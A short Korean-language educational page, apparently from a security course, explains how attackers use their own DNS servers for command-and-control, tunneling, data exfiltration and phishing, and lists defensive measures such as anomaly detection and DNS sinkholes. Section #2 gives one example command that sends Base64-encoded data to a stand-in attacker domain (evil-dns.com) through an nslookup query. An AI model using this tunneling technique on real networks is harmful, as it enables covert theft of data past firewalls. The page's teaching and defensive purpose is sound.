DNS 서버 확보

공격자의 은밀한 통신 채널 — DNS를 C2 인프라로 활용

#1. 악성 DNS 서버란?

🌐 ➜ 📡 ➜ 🔄 ➜ 💻

"모든 DNS 쿼리가 허용된다 — 방화벽을 뚫는 비밀 통로"

공격자는 자체 DNS 서버를 구축하여 C2(Command & Control) 통신, 데이터 유출, 피싱 인프라에 활용합니다. DNS 트래픽은 거의 모든 네트워크에서 허용되기 때문에 방화벽을 우회하는 은밀한 통신 채널이 됩니다.

악성 DNS 서버의 용도

  • ● DNS 터널링: DNS 쿼리/응답에 데이터를 숨겨 방화벽 우회
  • ● C2 통신: 악성코드가 DNS를 통해 명령을 수신
  • ● 데이터 유출: 민감 데이터를 DNS 쿼리에 인코딩하여 전송
  • ● 피싱 도메인: 정상 도메인과 유사한 이름으로 피싱 사이트 운영

#2. DNS 터널링 기법

DNS 터널링 동작 원리

# 데이터 유출 예시 (Base64 인코딩)
nslookup dGhlc2VjcmV0ZGF0YQ==.evil-dns.com
→ "thesecretdata"가 DNS 쿼리에 숨겨져 전송됨
→ evil-dns.com의 DNS 서버가 데이터를 디코딩
→ 방화벽은 "정상 DNS 쿼리"로 판단

방어 전략

  • ● DNS 트래픽 이상 탐지 (비정상적으로 긴 서브도메인, 높은 쿼리 빈도)
  • ● DNS 싱크홀을 통한 악성 도메인 차단
  • ● 내부 DNS 서버만 허용 (외부 DNS 직접 접근 차단)
  • ● DNS-over-HTTPS(DoH) 트래픽 모니터링
